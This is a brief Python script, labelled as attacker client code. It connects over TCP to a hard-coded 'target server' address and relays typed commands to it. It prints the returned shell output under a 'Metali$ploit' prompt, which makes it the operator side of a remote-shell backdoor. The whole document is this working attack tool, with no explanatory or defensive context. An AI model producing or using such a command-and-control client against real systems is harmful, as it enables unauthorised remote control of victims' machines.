#Attacker client code:
import socket, threading, time

#send message worker
def worker(s, com):
      soc.send(com.encode()) #send command

#get message worker
def worker2(s):
      print(s.recv(1024).decode()) #recv shell output
      print("Metali$ploit>>>", end="") 

    
with socket.socket() as soc:
      soc.connect(("192.168.0.105", 1234)) #connect to target server
      print("Metali$ploit>>>", end="") 
      command = ""
      while command!="q":
            command = input() #get command from user
            t=threading.Thread(target=worker, args=(soc,command)) #create new message push thread
            t.start()
            time.sleep(1)# give time for execution
            t2=threading.Thread(target=worker2, args=(soc,)) #create new message read thread
            t2.start()